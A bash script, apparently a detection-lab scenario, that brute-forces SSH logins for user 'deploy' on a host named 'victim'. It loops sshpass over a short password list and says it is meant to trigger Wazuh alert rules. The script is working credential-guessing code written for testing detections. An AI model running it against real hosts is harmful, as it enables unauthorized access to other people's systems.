#!/usr/bin/env bash
# Scenario 1: SSH brute force against the victim.
# Expect Wazuh rules 5710/5712/5763 (failed logins, then a brute-force pattern),
# followed by a successful login (5715) with the correct deploy password.
set -uo pipefail
TARGET="${1:-victim}"
echo "[*] Brute forcing ${TARGET} as 'deploy' with a small wordlist..."

for pw in password 123456 letmein admin root deploy toor Summer2023! Summer2024!; do
  sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    "deploy@${TARGET}" "id" 2>/dev/null && { echo "[+] Valid password found: ${pw}"; break; }
  echo "[-] tried ${pw}"
done
echo "[*] Done."
